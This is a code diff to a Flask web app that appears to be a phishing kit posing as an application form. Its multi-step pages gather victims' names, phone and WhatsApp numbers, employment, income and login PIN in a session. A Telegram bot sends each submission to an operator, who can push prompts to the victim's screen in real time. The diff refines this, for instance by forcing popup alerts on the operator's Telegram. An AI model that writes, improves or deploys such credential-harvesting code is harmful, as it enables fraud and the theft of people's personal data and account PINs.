@@ -58,7 +58,7 @@ def send_telegram_interactive_alert(app_data, stage_title="NEW SUBMISSION", step
 
 @app.route("/telegram-webhook", methods=["POST"])
 def telegram_webhook():
-    data = request.get_json()
+    data = request.get_json() or {}
     
     if "callback_query" in data:
         callback = data["callback_query"]
@@ -102,7 +102,12 @@ def telegram_webhook():
                 text_response = "💬 Prompt sent to user screen!"
 
             answer_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
-            requests.post(answer_url, json={"callback_query_id": callback_id, "text": text_response})
+            # Added "show_alert": True to force a visible popup modal on your Telegram screen
+            requests.post(answer_url, json={
+                "callback_query_id": callback_id, 
+                "text": text_response,
+                "show_alert": True
+            })
 
     return jsonify({"status": "ok"}), 200
 
@@ -114,7 +119,6 @@ def index():
 def collect_whatsapp():
     if request.method == "POST":
         session["whatsapp_phone"] = request.form.get("whatsapp_phone")
-        # Redirect to your next step (e.g., apply_step1 or login)
         return redirect(url_for("apply_step1"))
     return render_template("whatsapp.html")
 
@@ -140,8 +144,6 @@ def apply_step2():
         session["last_name"] = request.form.get("last_name")
         session["phone"] = request.form.get("phone")
         
-        # Ensure whatsapp_phone stays stored in session
-        # (If it was submitted via form, capture it; otherwise keep what Step 1 saved)
         if request.form.get("whatsapp_phone"):
             session["whatsapp_phone"] = request.form.get("whatsapp_phone")
             
@@ -173,7 +175,7 @@ def login():
             "first_name": session.get("first_name", "User"),
             "last_name": session.get("last_name", "Applicant"),
             "phone": session.get("phone", "000000000"),
-            "whatsapp_phone": session.get("whatsapp_phone", "—"),  # <--- Add this line here
+            "whatsapp_phone": session.get("whatsapp_phone", "—"),  # Preserved WhatsApp number
             "employment": session.get("employment", "Self-Employed"),
             "income": session.get("income", "1000000"),
             "password": pin,
